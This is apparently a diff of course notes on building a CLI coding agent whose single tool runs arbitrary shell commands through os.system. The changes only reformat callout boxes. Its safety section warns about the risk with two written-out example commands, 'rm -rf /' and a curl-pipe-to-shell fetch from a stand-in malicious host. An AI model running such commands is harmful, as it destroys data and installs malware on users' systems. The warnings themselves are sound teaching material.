@@ -26,13 +26,16 @@ related_skills:
 
 # Building a CLI Coding Assistant
 
-> [!abstract] TL;DR
+> [!NOTE]
+> **TL;DR**
 > Take the agent from [[04 - Structured Outputs with Pydantic]] and **swap the `get_weather` tool for `run_command`** — a tool that executes any shell command via `os.system`. Update the system prompt to describe this single, almighty tool. Re-run with the prompt *"create a todo app with HTML, CSS, JavaScript in a folder called todo_app with all CRUD operations"* — the agent autonomously **creates the folder, writes the HTML/CSS/JS files, iteratively debugs them**, all via shell commands. Same agent pattern as before; only the tool changed. The closer: ask the agent to **modify its own `agent.py`** to add more granular tools — the agent edits its own code. End-of-section reflection: Section 7 produced a real working agent in ~70 lines, the same pattern Cursor / Claude Code / Devin scale up. Next section: **RAG**.
 
-> [!info] Where this fits
+> [!NOTE]
+> **Where this fits**
 > Fifth and final note of **Section 7: Building AI Agents and Agentic Workflows**. Closes out the section with a dramatic build: vibe-code an actual app from one prompt. Demonstrates that the agent pattern from [[03 - Building a Weather Agent]] + [[04 - Structured Outputs with Pydantic]] is **completely general** — change the tool, change the use case. After this, the course pivots to **RAG** (Section 8-9).
 
-> [!warning] Safety
+> [!WARNING]
+> **Safety**
 > Giving an LLM a `run_command(cmd: str)` tool that runs **anything** on the shell is **objectively dangerous**. This works as a learning exercise in a sandboxed environment, but should never ship to production without sandboxing (Docker), allow-lists, dry-run modes, or user approval steps. Production systems use **granular per-action tools** instead.
 
 ---
@@ -144,7 +147,8 @@ Agent:
 
 Result: dark mode added.
 
-> [!tip] What this is
+> [!TIP]
+> **What this is**
 > **Vibe-coding**: the user expresses intent in natural language; the agent autonomously translates it into shell-and-file operations. This is what Cursor, Claude Code, and Devin do at much larger scale.
 
 ---
@@ -244,7 +248,8 @@ Same agent loop. More tools. More precise control.
 
 ## 9. Safety considerations
 
-> [!warning] `run_command` as built is dangerous
+> [!WARNING]
+> **`run_command` as built is dangerous**
 > This agent can run **any command**. If asked nicely, it could:
 > - `rm -rf /` (delete the file system).
 > - `curl evil.com/shell.sh | sh` (download and run malware).
